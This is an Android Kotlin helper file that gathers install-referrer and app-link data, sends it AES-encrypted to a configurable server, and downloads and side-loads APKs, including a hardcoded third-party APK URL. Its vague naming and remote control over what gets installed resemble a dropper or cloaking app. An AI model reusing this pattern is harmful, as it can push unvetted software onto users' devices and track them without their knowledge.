package com.cctv.libbbbbb

import android.app.DownloadManager
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.provider.Settings
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.FileProvider
import com.android.installreferrer.api.InstallReferrerClient
import com.android.installreferrer.api.InstallReferrerStateListener
import com.facebook.FacebookSdk
import com.facebook.applinks.AppLinkData
import com.google.gson.Gson
import com.hjq.permissions.OnPermissionCallback
import com.hjq.permissions.XXPermissions
import com.jakewharton.retrofit2.adapter.kotlin.coroutines.CoroutineCallAdapterFactory
import com.tencent.mmkv.MMKV
import es.dmoral.toasty.Toasty
import kotlinx.coroutines.*
import okhttp3.Interceptor
import okhttp3.OkHttpClient
import okhttp3.Response
import okhttp3.ResponseBody
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import java.io.File
import java.util.concurrent.TimeUnit

val c1 by lazy {
    creator1()
}

val c2 by lazy {
    creator2()
}

val TAG = "xxxxxxH"

val testUrl =
    "https://c911c3df879a675feb30aaafc46042de.dlied1.cdntips.net/imtt.dd.qq.com/sjy.10001/16891/apk/896B00016B948A65B3FBC800EACF8EA0.apk?mkey=61e4c2ecb68cbfed&f=0000&fsname=com.excean.dualaid_8.7.0_930.apk&csr=3554&cip=182.140.153.24&proto=https"

val filePath = Environment.getExternalStorageDirectory().absolutePath

val fileName = System.currentTimeMillis().toString() + ".apk"

fun AppCompatActivity.requestPermission(block: () -> Unit) {
    XXPermissions.with(this)
        .permission(BaseApp.instance!!.getPermissions())
        .request(object : OnPermissionCallback {
            override fun onGranted(permissions: MutableList<String>?, all: Boolean) {
                if (all) {
                    block()
                } else {
                    Toasty.info(
                        this@requestPermission,
                        "some permissions were not granted normally"
                    ).show()
                    finish()
                }
            }

            override fun onDenied(permissions: MutableList<String>?, never: Boolean) {
                Toasty.error(this@requestPermission, "no permissions").show()
                finish()
            }
        })
}

fun CoroutineScope.getFID(block: (id: String?) -> Unit) {
    launch(Dispatchers.IO) {
        var response: ResponseBody? = null
        try {
             response = c1.getFID()
        }catch (e : Exception){
            e.printStackTrace()
        }
        withContext(Dispatchers.Main) {
            block(response?.string())
        }
    }
}

fun CoroutineScope.potter(block: (response: String) -> Unit) {
    launch(Dispatchers.IO) {
        delay(1000)
        var response: ResponseBody? = null
        try {
            response = c2.potter(AesEncryptUtil.encrypt(Gson().toJson(requestBody())))
        }catch (e :Exception){
            e.printStackTrace()
        }
        withContext(Dispatchers.Main) {
                block(AesEncryptUtil.decrypt(response?.string()))

        }
    }
}

fun AppCompatActivity.registerIReceiver(){
    val intentFilter = IntentFilter()
    intentFilter.addAction("action_download")
    intentFilter.addAction(Intent.ACTION_PACKAGE_ADDED)
    intentFilter.addAction(DownloadManager.ACTION_DOWNLOAD_COMPLETE)
    intentFilter.addDataScheme("package")
    registerReceiver(IReceiver(), intentFilter)
}

private fun requestBody(): RequestEntity {
    val requestBean = RequestEntity()
    requestBean.appId = BaseApp.instance!!.getAppId()
    requestBean.appName = BaseApp.instance!!.getAppName()
    requestBean.applink = MMKV.defaultMMKV()!!.decodeString("appLink", "AppLink is empty")!!
    requestBean.ref = MMKV.defaultMMKV()!!.decodeString("ref", "Referrer is empty")!!
    requestBean.token = BaseApp.instance!!.getToken()
    requestBean.istatus = MMKV.defaultMMKV()!!.decodeBool("istatus", true)
    return requestBean
}

fun AppCompatActivity.setFid(s: String?) {
    s?.let {
        FacebookSdk.setApplicationId(it)
    } ?: run {
        FacebookSdk.setApplicationId("1598409150521518")
    }
    FacebookSdk.sdkInitialize(this)
}

fun AppCompatActivity.fetchAppLink() {
    val appLink = MMKV.defaultMMKV().decodeString("appLink", "AppLink is empty")
    if (appLink == "AppLink is empty") {
        AppLinkData.fetchDeferredAppLinkData(this) {
            it?.let {
                MMKV.defaultMMKV().encode("appLink", it.targetUri.toString())
            }
        }
    }
}

fun AppCompatActivity.getAppLink(): String? {
    val appLink = MMKV.defaultMMKV().decodeString("appLink", "AppLink is empty")
    return if (appLink == "AppLink is empty") {
        null
    } else {
        appLink
    }
}


fun AppCompatActivity.ref() {
    val ref = MMKV.defaultMMKV().decodeString("ref", "Referrer is empty")
    if (ref == "Referrer is empty") {
        InstallReferrerClient.newBuilder(this).build().apply {
            startConnection(object : InstallReferrerStateListener {
                override fun onInstallReferrerSetupFinished(responseCode: Int) {
                    try {
                        MMKV.defaultMMKV().encode("ref", installReferrer.installReferrer)
                    } catch (e: Exception) {
                        MMKV.defaultMMKV().encode("ref", "Referrer is empty")
                    }
                }

                override fun onInstallReferrerServiceDisconnected() {

                }
            })
        }
    }
}

fun AppCompatActivity.getRef(): String? {
    val ref = MMKV.defaultMMKV().decodeString("ref", "Referrer is empty")
    return if (ref == "Referrer is empty") {
        null
    } else {
        ref
    }
}

fun route2Setting(context: Context) {
    val uri = Uri.parse("package:" + context.packageName)
    val i = Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES, uri)
    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
    context.startActivity(i)
}

fun route2Install(context: Context, file: File) {
    if (!file.exists()) return
    var uri = if (Build.VERSION.SDK_INT >= 24) {
        FileProvider.getUriForFile(context, context.packageName.toString() + ".fileprovider", file)
    } else {
        Uri.fromFile(file)
    }
    if (Build.VERSION.SDK_INT >= 26) {
        if (!context.packageManager.canRequestPackageInstalls()) {
            Toasty.error(context, "No Permission")
            return
        }
    }
    val intent = Intent("android.intent.action.VIEW")
    intent.flags = Intent.FLAG_GRANT_READ_URI_PERMISSION
    if (Build.VERSION.SDK_INT >= 24) {
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
    }
    intent.setDataAndType(uri, "application/vnd.android.package-archive")
    context.startActivity(intent)
}


private fun clientCreator(block: OkHttpClient.Builder.() -> OkHttpClient.Builder = { this }) =
    OkHttpClient.Builder()
        .readTimeout(15000, TimeUnit.MILLISECONDS)
        .writeTimeout(15000, TimeUnit.MILLISECONDS)
        .connectTimeout(15000, TimeUnit.MILLISECONDS)
        .block()
        .addInterceptor(IInterceptor())
        .build()

private fun creator1() =
    Retrofit
        .Builder()
        .client(clientCreator())
        .addConverterFactory(GsonConverterFactory.create())
        .addCallAdapterFactory(CoroutineCallAdapterFactory())
        .baseUrl(BaseApp.instance!!.getUrl())
        .build()
        .create(IService::class.java)

private fun creator2() =
    Retrofit
        .Builder()
        .client(clientCreator())
        .addConverterFactory(GsonConverterFactory.create())
        .addCallAdapterFactory(CoroutineCallAdapterFactory())
        .baseUrl(BaseApp.instance!!.getUrl())
        .build()
        .create(IService::class.java)